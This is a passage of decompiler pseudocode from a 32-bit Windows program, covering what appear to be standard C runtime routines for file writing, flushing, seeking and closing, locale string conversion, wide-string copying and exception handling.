        if ( (int)v40 < v26 || v21 - (_BYTE *)lpBuffer >= nNumberOfBytesToWrite )
          goto LABEL_86;
      }
    }
  }
LABEL_85:
  *(_DWORD *)WideCharStr = GetLastError();
LABEL_86:
  if ( !v44 )
  {
    if ( *(_DWORD *)WideCharStr )
    {
      if ( *(_DWORD *)WideCharStr == 5 )
      {
        *sub_413A1F() = 9;
        *sub_413A32() = 5;
      }
      else
      {
        sub_413A45(*(DWORD *)WideCharStr);
      }
    }
    else
    {
      if ( (*(_BYTE *)(v6 + *v39 + 4) & 0x40) != 0 && *(_BYTE *)lpBuffer == 26 )
        return 0;
      *sub_413A1F() = 28;
      *sub_413A32() = 0;
    }
    return -1;
  }
  return v44 - v42;
}
// 416366: conditional instruction was optimized away because %nNumberOfBytesToWrite.4!=0
// 4165C2: conditional instruction was optimized away because %nNumberOfBytesToWrite.4!=0
// 416677: conditional instruction was optimized away because %nNumberOfBytesToWrite.4!=0
// 41674A: conditional instruction was optimized away because %nNumberOfBytesToWrite.4!=0
// 41653F: variable 'v37' is possibly undefined
// 429E00: using guessed type int dword_429E00[];
// 416219: using guessed type CHAR var_1410[3416];

//----- (00416916) --------------------------------------------------------
int __usercall sub_416916@<eax>(int *a1@<edi>, int a2, const void *a3, DWORD nNumberOfBytesToWrite)
{
  int v5; // esi
  int v6; // [esp+14h] [ebp-1Ch]

  if ( a2 == -2 )
  {
    *sub_413A32() = 0;
    *sub_413A1F() = 9;
    return -1;
  }
  if ( a2 < 0
    || a2 >= (unsigned int)dword_429DF8
    || (a1 = &dword_429E00[a2 >> 5], v5 = (a2 & 0x1F) << 6, (*(_BYTE *)(*a1 + v5 + 4) & 1) == 0) )
  {
    *sub_413A32() = 0;
    *sub_413A1F() = 9;
    sub_413993((int)a1);
    return -1;
  }
  sub_417E0A(a2);
  if ( (*(_BYTE *)(*a1 + v5 + 4) & 1) != 0 )
  {
    v6 = sub_416219(a2, a3, nNumberOfBytesToWrite);
  }
  else
  {
    *sub_413A1F() = 9;
    *sub_413A32() = 0;
    v6 = -1;
  }
  sub_417EA9(a2);
  return v6;
}
// 429DF8: using guessed type int dword_429DF8;
// 429E00: using guessed type int dword_429E00[];

//----- (004169EA) --------------------------------------------------------
int __usercall sub_4169EA@<eax>(int *a1@<edi>, int a2)
{
  int v3; // esi
  void *v4; // eax
  DWORD LastError; // [esp+14h] [ebp-1Ch]

  if ( a2 == -2 )
  {
    *sub_413A1F() = 9;
    return -1;
  }
  if ( a2 < 0
    || a2 >= (unsigned int)dword_429DF8
    || (a1 = &dword_429E00[a2 >> 5], v3 = (a2 & 0x1F) << 6, (*(_BYTE *)(v3 + *a1 + 4) & 1) == 0) )
  {
    *sub_413A1F() = 9;
    sub_413993((int)a1);
    return -1;
  }
  sub_417E0A(a2);
  if ( (*(_BYTE *)(v3 + *a1 + 4) & 1) != 0 )
  {
    v4 = (void *)sub_417DA1((int)a1, a2);
    if ( FlushFileBuffers(v4) )
      LastError = 0;
    else
      LastError = GetLastError();
    if ( !LastError )
      goto LABEL_15;
    *sub_413A32() = LastError;
  }
  *sub_413A1F() = 9;
  LastError = -1;
LABEL_15:
  sub_417EA9(a2);
  return LastError;
}
// 429DF8: using guessed type int dword_429DF8;
// 429E00: using guessed type int dword_429E00[];

//----- (00416AC3) --------------------------------------------------------
int __cdecl sub_416AC3(
        int a1,
        LCID Locale,
        DWORD dwMapFlags,
        LPCCH lpMultiByteStr,
        int cbMultiByte,
        LPWSTR lpDestStr,
        int cchDest,
        UINT CodePage,
        int a9)
{
  LPCCH v9; // eax
  int v10; // ecx
  int v11; // eax
  int v12; // eax
  int v13; // edi
  unsigned int v15; // eax
  void *v16; // esp
  WCHAR *v17; // eax
  unsigned int v18; // eax
  void *v19; // esp
  WCHAR *v20; // edi
  WCHAR *v21; // eax
  int v22; // eax
  _DWORD v23[2]; // [esp+0h] [ebp-1Ch] BYREF
  int v24; // [esp+8h] [ebp-14h] BYREF
  int cchSrc; // [esp+Ch] [ebp-10h]
  LPWSTR lpWideCharStr; // [esp+10h] [ebp-Ch]
  int cchWideChar; // [esp+14h] [ebp-8h]

  if ( cbMultiByte > 0 )
  {
    v9 = lpMultiByteStr;
    v10 = cbMultiByte;
    while ( 1 )
    {
      --v10;
      if ( !*v9 )
        break;
      ++v9;
      if ( !v10 )
      {
        v10 = -1;
        break;
      }
    }
    v11 = cbMultiByte - v10 - 1;
    if ( v11 < cbMultiByte )
      v11 = cbMultiByte - v10;
    cbMultiByte = v11;
  }
  cchWideChar = 0;
  if ( !CodePage )
    CodePage = *(_DWORD *)(*(_DWORD *)a1 + 4);
  v12 = MultiByteToWideChar(CodePage, 8 * (a9 != 0) + 1, lpMultiByteStr, cbMultiByte, 0, 0);
  v13 = v12;
  cchSrc = v12;
  if ( !v12 )
    return 0;
  if ( v12 > 0 && 0xFFFFFFE0 / v12 >= 2 )
  {
    v15 = 2 * v12 + 8;
    if ( v15 > 0x400 )
    {
      v17 = (WCHAR *)sub_41573D((LPVOID)v13, 2 * v13 + 8);
      if ( v17 )
      {
        *(_DWORD *)v17 = 56797;
        goto LABEL_20;
      }
    }
    else
    {
      v16 = alloca(v15);
      v17 = (WCHAR *)v23;
      if ( v23 )
      {
        v23[0] = 52428;
LABEL_20:
        v17 += 4;
      }
    }
    lpWideCharStr = v17;
    goto LABEL_23;
  }
  lpWideCharStr = 0;
LABEL_23:
  if ( !lpWideCharStr )
    return 0;
  if ( MultiByteToWideChar(CodePage, 1u, lpMultiByteStr, cbMultiByte, lpWideCharStr, v13) )
  {
    cchWideChar = LCMapStringW(Locale, dwMapFlags, lpWideCharStr, v13, 0, 0);
    if ( cchWideChar )
    {
      if ( (dwMapFlags & 0x400) != 0 )
      {
        if ( cchDest )
        {
          if ( cchWideChar <= cchDest )
            LCMapStringW(Locale, dwMapFlags, lpWideCharStr, v13, lpDestStr, cchDest);
        }
        goto LABEL_46;
      }
      if ( cchWideChar <= 0 || 0xFFFFFFE0 / cchWideChar < 2 )
      {
        v20 = 0;
LABEL_39:
        if ( v20 )
        {
          if ( LCMapStringW(Locale, dwMapFlags, lpWideCharStr, cchSrc, v20, cchWideChar) )
          {
            if ( cchDest )
              v22 = WideCharToMultiByte(CodePage, 0, v20, cchWideChar, (LPSTR)lpDestStr, cchDest, 0, 0);
            else
              v22 = WideCharToMultiByte(CodePage, 0, v20, cchWideChar, 0, 0, 0, 0);
            cchWideChar = v22;
          }
          sub_415C91((int)v20);
        }
        goto LABEL_46;
      }
      v18 = 2 * cchWideChar + 8;
      if ( v18 > 0x400 )
      {
        v21 = (WCHAR *)sub_41573D((LPVOID)cchWideChar, 2 * cchWideChar + 8);
        if ( v21 )
        {
          *(_DWORD *)v21 = 56797;
          v21 += 4;
        }
        v20 = v21;
        goto LABEL_39;
      }
      v19 = alloca(v18);
      if ( v23 )
      {
        v23[0] = 52428;
        v20 = (WCHAR *)&v24;
        goto LABEL_39;
      }
    }
  }
LABEL_46:
  sub_415C91((int)lpWideCharStr);
  return cchWideChar;
}

//----- (00416CAA) --------------------------------------------------------
int __usercall sub_416CAA@<eax>(
        int a1@<edi>,
        _DWORD *a2,
        LCID Locale,
        DWORD dwMapFlags,
        LPCCH lpMultiByteStr,
        int cbMultiByte,
        LPWSTR lpDestStr,
        int cchDest,
        UINT CodePage,
        int a10)
{
  int result; // eax
  int v11[2]; // [esp+0h] [ebp-10h] BYREF
  int v12; // [esp+8h] [ebp-8h]
  char v13; // [esp+Ch] [ebp-4h]

  sub_413C17((int)v11, a1, a2);
  result = sub_416AC3((int)v11, Locale, dwMapFlags, lpMultiByteStr, cbMultiByte, lpDestStr, cchDest, CodePage, a10);
  if ( v13 )
    *(_DWORD *)(v12 + 112) &= ~2u;
  return result;
}

//----- (00416CF0) --------------------------------------------------------
BOOL __cdecl sub_416CF0(
        int a1,
        DWORD dwInfoType,
        LPCCH lpMultiByteStr,
        int cbMultiByte,
        LPWORD lpCharType,
        UINT CodePage,
        int a7)
{
  WCHAR *v7; // ebx
  int v8; // eax
  int v9; // edi
  unsigned int v11; // eax
  void *v12; // esp
  WCHAR *v13; // eax
  int v14; // eax
  _DWORD v15[3]; // [esp+0h] [ebp-14h] BYREF
  BOOL StringTypeW; // [esp+Ch] [ebp-8h]

  v7 = 0;
  StringTypeW = 0;
  if ( !CodePage )
    CodePage = *(_DWORD *)(*(_DWORD *)a1 + 4);
  v8 = MultiByteToWideChar(CodePage, 8 * (a7 != 0) + 1, lpMultiByteStr, cbMultiByte, 0, 0);
  v9 = v8;
  if ( !v8 )
    return 0;
  if ( v8 <= 0 || (unsigned int)v8 > 0x7FFFFFF0 )
    goto LABEL_14;
  v11 = 2 * v8 + 8;
  if ( v11 > 0x400 )
  {
    v13 = (WCHAR *)sub_41573D((LPVOID)v9, 2 * v9 + 8);
    if ( v13 )
    {
      *(_DWORD *)v13 = 56797;
      goto LABEL_12;
    }
  }
  else
  {
    v12 = alloca(v11);
    v13 = (WCHAR *)v15;
    if ( v15 )
    {
      v15[0] = 52428;
LABEL_12:
      v13 += 4;
    }
  }
  v7 = v13;
LABEL_14:
  if ( !v7 )
    return 0;
  sub_413EB0((int)v7, 0, 2 * v9);
  v14 = MultiByteToWideChar(CodePage, 1u, lpMultiByteStr, cbMultiByte, v7, v9);
  if ( v14 )
    StringTypeW = GetStringTypeW(dwInfoType, v7, v14, lpCharType);
  sub_415C91((int)v7);
  return StringTypeW;
}

//----- (00416DD7) --------------------------------------------------------
BOOL __usercall sub_416DD7@<eax>(
        int a1@<edi>,
        _DWORD *a2,
        DWORD dwInfoType,
        LPCCH lpMultiByteStr,
        int cbMultiByte,
        LPWORD lpCharType,
        UINT CodePage,
        int a8,
        int a9)
{
  BOOL result; // eax
  int v10[2]; // [esp+0h] [ebp-10h] BYREF
  int v11; // [esp+8h] [ebp-8h]
  char v12; // [esp+Ch] [ebp-4h]

  sub_413C17((int)v10, a1, a2);
  result = sub_416CF0((int)v10, dwInfoType, lpMultiByteStr, cbMultiByte, lpCharType, CodePage, a9);
  if ( v12 )
    *(_DWORD *)(v11 + 112) &= ~2u;
  return result;
}

//----- (00416E17) --------------------------------------------------------
void __cdecl sub_416E17(LPVOID *a1)
{
  if ( a1 )
  {
    sub_4139A3(a1[1]);
    sub_4139A3(a1[2]);
    sub_4139A3(a1[3]);
    sub_4139A3(a1[4]);
    sub_4139A3(a1[5]);
    sub_4139A3(a1[6]);
    sub_4139A3(*a1);
    sub_4139A3(a1[8]);
    sub_4139A3(a1[9]);
    sub_4139A3(a1[10]);
    sub_4139A3(a1[11]);
    sub_4139A3(a1[12]);
    sub_4139A3(a1[13]);
    sub_4139A3(a1[7]);
    sub_4139A3(a1[14]);
    sub_4139A3(a1[15]);
    sub_4139A3(a1[16]);
    sub_4139A3(a1[17]);
    sub_4139A3(a1[18]);
    sub_4139A3(a1[19]);
    sub_4139A3(a1[20]);
    sub_4139A3(a1[21]);
    sub_4139A3(a1[22]);
    sub_4139A3(a1[23]);
    sub_4139A3(a1[24]);
    sub_4139A3(a1[25]);
    sub_4139A3(a1[26]);
    sub_4139A3(a1[27]);
    sub_4139A3(a1[28]);
    sub_4139A3(a1[29]);
    sub_4139A3(a1[30]);
    sub_4139A3(a1[31]);
    sub_4139A3(a1[32]);
    sub_4139A3(a1[33]);
    sub_4139A3(a1[34]);
    sub_4139A3(a1[35]);
    sub_4139A3(a1[36]);
    sub_4139A3(a1[37]);
    sub_4139A3(a1[38]);
    sub_4139A3(a1[39]);
    sub_4139A3(a1[40]);
    sub_4139A3(a1[41]);
    sub_4139A3(a1[42]);
    sub_4139A3(a1[47]);
    sub_4139A3(a1[48]);
    sub_4139A3(a1[49]);
    sub_4139A3(a1[50]);
    sub_4139A3(a1[51]);
    sub_4139A3(a1[52]);
    sub_4139A3(a1[46]);
    sub_4139A3(a1[54]);
    sub_4139A3(a1[55]);
    sub_4139A3(a1[56]);
    sub_4139A3(a1[57]);
    sub_4139A3(a1[58]);
    sub_4139A3(a1[59]);
    sub_4139A3(a1[53]);
    sub_4139A3(a1[60]);
    sub_4139A3(a1[61]);
    sub_4139A3(a1[62]);
    sub_4139A3(a1[63]);
    sub_4139A3(a1[64]);
    sub_4139A3(a1[65]);
    sub_4139A3(a1[66]);
    sub_4139A3(a1[67]);
    sub_4139A3(a1[68]);
    sub_4139A3(a1[69]);
    sub_4139A3(a1[70]);
    sub_4139A3(a1[71]);
    sub_4139A3(a1[72]);
    sub_4139A3(a1[73]);
    sub_4139A3(a1[74]);
    sub_4139A3(a1[75]);
    sub_4139A3(a1[76]);
    sub_4139A3(a1[77]);
    sub_4139A3(a1[78]);
    sub_4139A3(a1[79]);
    sub_4139A3(a1[80]);
    sub_4139A3(a1[81]);
    sub_4139A3(a1[82]);
    sub_4139A3(a1[83]);
    sub_4139A3(a1[84]);
    sub_4139A3(a1[85]);
    sub_4139A3(a1[86]);
    sub_4139A3(a1[87]);
    sub_4139A3(a1[88]);
  }
}

//----- (0041718E) --------------------------------------------------------
void __cdecl sub_41718E(int a1)
{
  void *v1; // esi

  if ( a1 )
  {
    if ( *(void **)a1 != off_423D90 )
      sub_4139A3(*(LPVOID *)a1);
    if ( *(void **)(a1 + 4) != off_423D94 )
      sub_4139A3(*(LPVOID *)(a1 + 4));
    if ( *(void **)(a1 + 8) != off_423D98 )
      sub_4139A3(*(LPVOID *)(a1 + 8));
    if ( *(void **)(a1 + 48) != off_423DC0 )
      sub_4139A3(*(LPVOID *)(a1 + 48));
    v1 = *(void **)(a1 + 52);
    if ( v1 != off_423DC4 )
      sub_4139A3(v1);
  }
}
// 423D90: using guessed type void *off_423D90;
// 423D94: using guessed type void *off_423D94;
// 423D98: using guessed type void *off_423D98;
// 423DC0: using guessed type void *off_423DC0;
// 423DC4: using guessed type void *off_423DC4;

//----- (004171F7) --------------------------------------------------------
void __cdecl sub_4171F7(int a1)
{
  void *v1; // esi

  if ( a1 )
  {
    if ( *(void **)(a1 + 12) != off_423D9C )
      sub_4139A3(*(LPVOID *)(a1 + 12));
    if ( *(void **)(a1 + 16) != off_423DA0 )
      sub_4139A3(*(LPVOID *)(a1 + 16));
    if ( *(void **)(a1 + 20) != off_423DA4 )
      sub_4139A3(*(LPVOID *)(a1 + 20));
    if ( *(void **)(a1 + 24) != off_423DA8 )
      sub_4139A3(*(LPVOID *)(a1 + 24));
    if ( *(void **)(a1 + 28) != off_423DAC )
      sub_4139A3(*(LPVOID *)(a1 + 28));
    if ( *(void **)(a1 + 32) != off_423DB0 )
      sub_4139A3(*(LPVOID *)(a1 + 32));
    if ( *(void **)(a1 + 36) != off_423DB4 )
      sub_4139A3(*(LPVOID *)(a1 + 36));
    if ( *(void **)(a1 + 56) != off_423DC8 )
      sub_4139A3(*(LPVOID *)(a1 + 56));
    if ( *(void **)(a1 + 60) != off_423DCC )
      sub_4139A3(*(LPVOID *)(a1 + 60));
    if ( *(void **)(a1 + 64) != off_423DD0 )
      sub_4139A3(*(LPVOID *)(a1 + 64));
    if ( *(void **)(a1 + 68) != off_423DD4 )
      sub_4139A3(*(LPVOID *)(a1 + 68));
    if ( *(void **)(a1 + 72) != off_423DD8 )
      sub_4139A3(*(LPVOID *)(a1 + 72));
    v1 = *(void **)(a1 + 76);
    if ( v1 != off_423DDC )
      sub_4139A3(v1);
  }
}
// 423D9C: using guessed type void *off_423D9C;
// 423DA0: using guessed type void *off_423DA0;
// 423DA4: using guessed type void *off_423DA4;
// 423DA8: using guessed type void *off_423DA8;
// 423DAC: using guessed type void *off_423DAC;
// 423DB0: using guessed type void *off_423DB0;
// 423DB4: using guessed type void *off_423DB4;
// 423DC8: using guessed type void *off_423DC8;
// 423DCC: using guessed type void *off_423DCC;
// 423DD0: using guessed type void *off_423DD0;
// 423DD4: using guessed type void *off_423DD4;
// 423DD8: using guessed type void *off_423DD8;
// 423DDC: using guessed type void *off_423DDC;

//----- (004172F5) --------------------------------------------------------
__int64 __usercall sub_4172F5@<edx:eax>(int a1@<edi>, int a2, int a3, int a4, DWORD dwMoveMethod)
{
  void *v5; // eax
  DWORD LastError; // eax
  _BYTE *v8; // eax
  __int64 lDistanceToMove; // [esp+8h] [ebp-8h] BYREF

  HIDWORD(lDistanceToMove) = a4;
  v5 = (void *)sub_417DA1(a1, a2);
  if ( v5 == (void *)-1 )
  {
    *sub_413A1F() = 9;
    return -1i64;
  }
  LODWORD(lDistanceToMove) = SetFilePointer(v5, a3, (PLONG)&lDistanceToMove + 1, dwMoveMethod);
  if ( (_DWORD)lDistanceToMove == -1 )
  {
    LastError = GetLastError();
    if ( LastError )
    {
      sub_413A45(LastError);
      return -1i64;
    }
  }
  v8 = (_BYTE *)(dword_429E00[a2 >> 5] + ((a2 & 0x1F) << 6) + 4);
  *v8 &= ~2u;
  return lDistanceToMove;
}
// 429E00: using guessed type int dword_429E00[];

//----- (0041737A) --------------------------------------------------------
void __usercall __noreturn sub_41737A(int a1@<edi>)
{
  sub_414369(a1, 2);
}

//----- (004173B0) --------------------------------------------------------
#error "4173CB: call analysis failed (funcsize=22)"

//----- (004173F5) --------------------------------------------------------
int __usercall sub_4173F5@<eax>(int a1@<ebp>, int a2, unsigned int a3)
{
  int result; // eax
  int v4; // ebx
  unsigned int v5; // esi
  int v6; // esi

  while ( 1 )
  {
    result = a2;
    v4 = *(_DWORD *)(a2 + 8);
    v5 = *(_DWORD *)(a2 + 12);
    if ( v5 == -1 || a3 != -1 && v5 <= a3 )
      break;
    v6 = 3 * v5;
    *(_DWORD *)(a2 + 12) = *(_DWORD *)(v4 + 4 * v6);
    if ( !*(_DWORD *)(v4 + 4 * v6 + 4) )
    {
      sub_4174A5(*(_DWORD *)(v4 + 4 * v6 + 8), a1, 257);
      sub_4174C4(*(int (**)(void))(v4 + 4 * v6 + 8));
    }
  }
  return result;
}
// 423460: using guessed type int dword_423460;

//----- (00417479) --------------------------------------------------------
BOOL sub_417479()
{
  BOOL result; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // ecx

  result = 0;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  if ( (_DWORD (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))ExceptionList->Handler == sub_4173B0 )
    return ExceptionList[1].Next == (struct _EXCEPTION_REGISTRATION_RECORD *)*((_DWORD *)ExceptionList[1].Handler + 3);
  return result;
}
// 4173B0: using guessed type _DWORD __cdecl sub_4173B0(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0041749C) --------------------------------------------------------
void __stdcall sub_41749C(int a1)
{
  JUMPOUT(0x4174B0);
}
// 4174A3: control flows out of bounds to 4174B0

//----- (004174A5) --------------------------------------------------------
int __userpurge sub_4174A5@<eax>(int result@<eax>, int a2@<ebp>, int a3)
{
  dword_423DF0[2] = a3;
  dword_423DF0[1] = result;
  dword_423DF0[3] = a2;
  return result;
}
// 423DF0: using guessed type _DWORD dword_423DF0[4];

//----- (004174C4) --------------------------------------------------------
int __usercall sub_4174C4@<eax>(int (*a1)(void)@<eax>)
{
  return a1();
}

//----- (004175CA) --------------------------------------------------------
LONG __userpurge TopLevelExceptionFilter@<eax>(int a1@<edi>, int a2@<esi>, struct _EXCEPTION_POINTERS *ExceptionInfo)
{
  PEXCEPTION_RECORD ExceptionRecord; // eax
  ULONG_PTR v4; // eax

  ExceptionRecord = ExceptionInfo->ExceptionRecord;
  if ( ExceptionInfo->ExceptionRecord->ExceptionCode == -529697949 && ExceptionRecord->NumberParameters == 3 )
  {
    v4 = ExceptionRecord->ExceptionInformation[0];
    if ( v4 == 429065504 || v4 == 429065505 || v4 == 429065506 || v4 == 26820608 )
      sub_415CB1(a1, a2);
  }
  return 0;
}

//----- (0041760C) --------------------------------------------------------
int sub_41760C()
{
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)TopLevelExceptionFilter);
  return 0;
}

//----- (0041764C) --------------------------------------------------------
void __usercall __noreturn sub_41764C(int a1@<edi>, int a2@<esi>)
{
  if ( sub_415D21() )
    sub_415D2E(22);
  if ( (byte_423E04 & 2) != 0 )
    sub_413818(a1, a2, 3, 1073741845, 1);
  sub_414353(3u);
  __debugbreak();
}
// 423E04: using guessed type char byte_423E04;

//----- (0041767F) --------------------------------------------------------
int __cdecl sub_41767F(int a1, int a2, int a3)
{
  HMODULE LibraryW; // eax
  HMODULE v4; // ebx
  int (__stdcall *MessageBoxW)(HWND, LPCWSTR, LPCWSTR, UINT); // eax
  HWND (__stdcall *GetActiveWindow)(); // eax
  HWND (__stdcall *GetLastActivePopup)(HWND); // eax
  BOOL (__stdcall *GetUserObjectInformationW)(HANDLE, int, PVOID, DWORD, LPDWORD); // eax
  HWINSTA (__stdcall *GetProcessWindowStation)(); // eax
  int (*v10)(void); // edi
  int (__stdcall *v11)(int, int, char *, int, char *); // eax
  int (__stdcall *v12)(int, int, char *, int, char *); // ebx
  int v13; // eax
  int (*v14)(void); // eax
  int (__stdcall *v15)(int); // eax
  int (__stdcall *v16)(int, int, int, int); // eax
  char v18[4]; // [esp+Ch] [ebp-24h] BYREF
  int v19; // [esp+10h] [ebp-20h]
  int v20; // [esp+14h] [ebp-1Ch]
  PVOID v21; // [esp+18h] [ebp-18h]
  int v22; // [esp+1Ch] [ebp-14h]
  char v23[12]; // [esp+20h] [ebp-10h] BYREF

  v19 = a1;
  v20 = a2;
  v22 = 0;
  v21 = sub_41404C();
  if ( !dword_425F0C )
  {
    LibraryW = LoadLibraryW(L"USER32.DLL");
    v4 = LibraryW;
    if ( !LibraryW )
      return 0;
    MessageBoxW = (int (__stdcall *)(HWND, LPCWSTR, LPCWSTR, UINT))GetProcAddress(LibraryW, "MessageBoxW");
    if ( !MessageBoxW )
      return 0;
    dword_425F0C = EncodePointer(MessageBoxW);
    GetActiveWindow = (HWND (__stdcall *)())GetProcAddress(v4, "GetActiveWindow");
    dword_425F10 = EncodePointer(GetActiveWindow);
    GetLastActivePopup = (HWND (__stdcall *)(HWND))GetProcAddress(v4, "GetLastActivePopup");
    dword_425F14 = EncodePointer(GetLastActivePopup);
    GetUserObjectInformationW = (BOOL (__stdcall *)(HANDLE, int, PVOID, DWORD, LPDWORD))GetProcAddress(
                                                                                          v4,
                                                                                          "GetUserObjectInformationW");
    dword_425F1C = EncodePointer(GetUserObjectInformationW);
    if ( dword_425F1C )
    {
      GetProcessWindowStation = (HWINSTA (__stdcall *)())GetProcAddress(v4, "GetProcessWindowStation");
      dword_425F18 = EncodePointer(GetProcessWindowStation);
    }
  }
  if ( dword_425F18 == v21
    || dword_425F1C == v21
    || (v10 = (int (*)(void))DecodePointer(dword_425F18),
        v11 = (int (__stdcall *)(int, int, char *, int, char *))DecodePointer(dword_425F1C),
        v12 = v11,
        !v10)
    || !v11
    || (v13 = v10()) != 0 && v12(v13, 1, v23, 12, v18) && (v23[8] & 1) != 0 )
  {
    if ( dword_425F10 != v21 )
    {
      v14 = (int (*)(void))DecodePointer(dword_425F10);
      if ( v14 )
      {
        v22 = v14();
        if ( v22 )
        {
          if ( dword_425F14 != v21 )
          {
            v15 = (int (__stdcall *)(int))DecodePointer(dword_425F14);
            if ( v15 )
              v22 = v15(v22);
          }
        }
      }
    }
  }
  else
  {
    a3 |= 0x200000u;
  }
  v16 = (int (__stdcall *)(int, int, int, int))DecodePointer(dword_425F0C);
  if ( v16 )
    return v16(v22, v19, v20, a3);
  return 0;
}
// 41767F: using guessed type char var_24[4];

//----- (004177EB) --------------------------------------------------------
int __usercall sub_4177EB@<eax>(__int16 *a1@<ecx>, int a2@<edi>, char *a3, int a4, __int16 *a5)
{
  int v5; // esi
  int result; // eax
  char *v7; // edx
  char *v8; // edx
  __int16 v9; // ax

  if ( !a3 )
    goto LABEL_3;
  a2 = a4;
  if ( !a4 )
    goto LABEL_3;
  a1 = a5;
  if ( !a5 )
    goto LABEL_7;
  v7 = a3;
  do
  {
    if ( !*(_WORD *)v7 )
      break;
    v7 += 2;
    --a2;
  }
  while ( a2 );
  if ( !a2 )
  {
LABEL_7:
    *(_WORD *)a3 = 0;
LABEL_3:
    v5 = 22;
    *(_DWORD *)sub_413A1F(a1) = 22;
LABEL_4:
    sub_413993(a2);
    return v5;
  }
  v8 = (char *)(v7 - (char *)a5);
  do
  {
    v9 = *a1;
    *(__int16 *)((char *)a1 + (_DWORD)v8) = *a1;
    ++a1;
    if ( !v9 )
      break;
    --a2;
  }
  while ( a2 );
  result = 0;
  if ( !a2 )
  {
    *(_WORD *)a3 = 0;
    *(_DWORD *)sub_413A1F(a1) = 34;
    v5 = 34;
    goto LABEL_4;
  }
  return result;
}
// 413A1F: using guessed type int __fastcall sub_413A1F(_DWORD);

//----- (00417860) --------------------------------------------------------
int __usercall sub_417860@<eax>(__int16 *a1@<ecx>, int a2@<edi>, _WORD *a3, int a4, __int16 *a5, int a6)
{
  int v6; // ebx
  int v8; // esi
  _WORD *v9; // eax
  __int16 v10; // ax

  v6 = a6;
  if ( a6 )
  {
    if ( !a3 )
    {
LABEL_7:
      v8 = 22;
      *(_DWORD *)sub_413A1F(a1) = 22;
LABEL_8:
      sub_413993(a2);
      return v8;
    }
  }
  else if ( !a3 )
  {
    if ( !a4 )
      return 0;
    goto LABEL_7;
  }
  a2 = a4;
  if ( !a4 )
    goto LABEL_7;
  if ( !a6 )
  {
    *a3 = 0;
    return 0;
  }
  a1 = a5;
  if ( !a5 )
  {
    *a3 = 0;
    goto LABEL_7;
  }
  v9 = a3;
  if ( a6 == -1 )
  {
    do
    {
      v10 = *a1;
      *(__int16 *)((char *)a1 + (char *)a3 - (char *)a5) = *a1;
      ++a1;
      if ( !v10 )
        break;
      --a2;
    }
    while ( a2 );
  }
  else
  {
    do
    {
      a1 = (__int16 *)*(unsigned __int16 *)((char *)v9 + (char *)a5 - (char *)a3);
      *v9++ = (_WORD)a1;
      if ( !(_WORD)a1 )
        break;
      if ( !--a2 )
        break;
      --v6;
    }
    while ( v6 );
    if ( !v6 )
    {
      a1 = 0;
      *v9 = 0;
    }
  }
  if ( a2 )
    return 0;
  if ( v6 != -1 )
  {
    *a3 = 0;
    *(_DWORD *)sub_413A1F(a1) = 34;
    v8 = 34;
    goto LABEL_8;
  }
  a3[a4 - 1] = 0;
  return 80;
}
// 413A1F: using guessed type int __fastcall sub_413A1F(_DWORD);

//----- (0041792D) --------------------------------------------------------
int __cdecl sub_41792D(_WORD *a1)
{
  _WORD *v1; // eax

  v1 = a1;
  while ( *v1++ )
    ;
  return v1 - a1 - 1;
}

//----- (00417948) --------------------------------------------------------
int __usercall sub_417948@<eax>(int a1@<ecx>, int a2@<edi>, char *a3, int a4, char *a5)
{
  int v5; // esi
  int result; // eax
  char *v7; // eax
  int v8; // ecx

  if ( !a3 )
    goto LABEL_3;
  a2 = a4;
  if ( !a4 )
    goto LABEL_3;
  v7 = a5;
  if ( !a5 )
  {
    *(_WORD *)a3 = 0;
LABEL_3:
    v5 = 22;
    *(_DWORD *)sub_413A1F(a1) = 22;
LABEL_4:
    sub_413993(a2);
    return v5;
  }
  do
  {
    v8 = *(unsigned __int16 *)v7;
    *(_WORD *)&v7[a3 - a5] = v8;
    v7 += 2;
    if ( !(_WORD)v8 )
      break;
    --a2;
  }
  while ( a2 );
  result = 0;
  if ( !a2 )
  {
    *(_WORD *)a3 = 0;
    *(_DWORD *)sub_413A1F(v8) = 34;
    v5 = 34;
    goto LABEL_4;
  }
  return result;
}
// 413A1F: using guessed type int __fastcall sub_413A1F(_DWORD);

//----- (004179AB) --------------------------------------------------------
int __usercall sub_4179AB@<eax>(int a1@<edi>, int a2)
{
  int result; // eax

  if ( a2 >= 0 )
  {
    if ( a2 <= 2 )
    {
      result = dword_42579C;
      dword_42579C = a2;
      return result;
    }
    if ( a2 == 3 )
      return dword_42579C;
  }
  *(_DWORD *)sub_413A1F(a2) = 22;
  sub_413993(a1);
  return -1;
}
// 413A1F: using guessed type int __fastcall sub_413A1F(_DWORD);
// 42579C: using guessed type int dword_42579C;

//----- (004179EA) --------------------------------------------------------
int __usercall sub_4179EA@<eax>(int a1@<edi>, int a2)
{
  void *v2; // eax
  DWORD LastError; // edi

  if ( sub_417DA1(a1, a2) == -1
    || (a2 == 1 && (*(_BYTE *)(dword_429E00[0] + 132) & 1) != 0 || a2 == 2
                                                                && (*(_BYTE *)(dword_429E00[0] + 68) & 1) != 0)
    && (a1 = sub_417DA1(a1, 2), sub_417DA1(a1, 1) == a1)
    || (v2 = (void *)sub_417DA1(a1, a2), CloseHandle(v2)) )
  {
    LastError = 0;
  }
  else
  {
    LastError = GetLastError();
  }
  sub_417D1B(a2);
  *(_BYTE *)(dword_429E00[a2 >> 5] + ((a2 & 0x1F) << 6) + 4) = 0;
  if ( !LastError )
    return 0;
  sub_413A45(LastError);
  return -1;
}
// 429E00: using guessed type int dword_429E00[];

//----- (00417A86) --------------------------------------------------------
int __usercall sub_417A86@<eax>(int *a1@<edi>, int a2)
{
  int v3; // esi
  int v4; // [esp+14h] [ebp-1Ch]

  if ( a2 == -2 )
  {
    *sub_413A32() = 0;
    *sub_413A1F() = 9;
    return -1;
  }
  if ( a2 < 0
    || a2 >= (unsigned int)dword_429DF8
    || (a1 = &dword_429E00[a2 >> 5], v3 = (a2 & 0x1F) << 6, (*(_BYTE *)(*a1 + v3 + 4) & 1) == 0) )
  {
    *sub_413A32() = 0;
    *sub_413A1F() = 9;
    sub_413993((int)a1);
    return -1;
  }
  sub_417E0A(a2);
  if ( (*(_BYTE *)(*a1 + v3 + 4) & 1) != 0 )
  {
    v4 = sub_4179EA((int)a1, a2);
  }
  else
  {
    *sub_413A1F() = 9;
    v4 = -1;
  }
  sub_417EA9(a2);
  return v4;
}
// 429DF8: using guessed type int dword_429DF8;
